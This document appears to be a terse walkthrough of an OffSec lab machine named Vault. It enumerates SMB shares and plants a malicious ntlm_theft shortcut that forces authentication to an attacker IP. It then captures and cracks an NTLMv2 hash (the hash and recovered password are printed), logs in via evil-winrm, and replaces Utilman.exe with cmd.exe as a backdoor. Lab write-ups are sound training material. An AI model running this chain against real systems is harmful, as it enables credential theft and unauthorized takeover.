@@ -1,0 +1,82 @@
+Vault
+
+192.168.122.172
+
+sudo nmap -Pn -n 192.168.122.172 -sC -sV -p- --open 
+vault.offsec
+
+sudo nmap -Pn -n 192.168.122.172 -sU --top-ports=100 --reason
+
+
+Kerberos Authentication
+nmap -Pn -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm="vault.offsec",userdb=/usr/share/seclists/Usernames/Names/names.txt 192.168.122.172
+
+ldapsearch -H ldap://192.168.122.172 -x -b"DC=vault,DC=offsec" 
+rpcclient \\\\192.168.122.172\\
+Nothing
+smbclient -L \\\\192.168.122.172\\
+DocumentsShare
+smbclient \\\\192.168.122.172\\DocumentsShare
+
+create a file test.txt
+put test.txt
+successful , I can upload files
+
+we should upload mulicious file for capturing hash using responder
+
+https://github.com/Greenwolf/ntlm_theft
+git clone https://github.com/Greenwolf/ntlm_theft.git
+cd ntlm_theft
+python ntlm_theft.py -g lnk -s 192.168.45.181 -f vault 
+cp ntlm_theft/vault/vault.lnk .
+
+sudo responder -I tun0 -A
+
+anirudh::VAULT:46c59bb3af5aeee0:9FB77C168A17644D954A9B886FF86719:010100000000000080EC1407711ADB0110AA93F730758847000000000200080055004F0033004F0001001E00570049004E002D005A004500500030004600420032005A0057005400570004003400570049004E002D005A004500500030004600420032005A005700540057002E0055004F0033004F002E004C004F00430041004C000300140055004F0033004F002E004C004F00430041004C000500140055004F0033004F002E004C004F00430041004C000700080080EC1407711ADB01060004000200000008003000300000000000000001000000002000001830F0C706803F0173332094F5B2BB5FB0C4DAD79922348512363CC7DC51C8100A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100380031000000000000000000 
+cat >hash.txt
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+SecureHM         (anirudh)  
+
+evil-winrm -i 192.168.122.172 -u anirudh -p SecureHM
+
+
+mv C:\Windows\System32\Utilman.exe C:\Windows\System32\Utilman.old
+mv C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe
+
+rdesktop 192.168.122.172
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
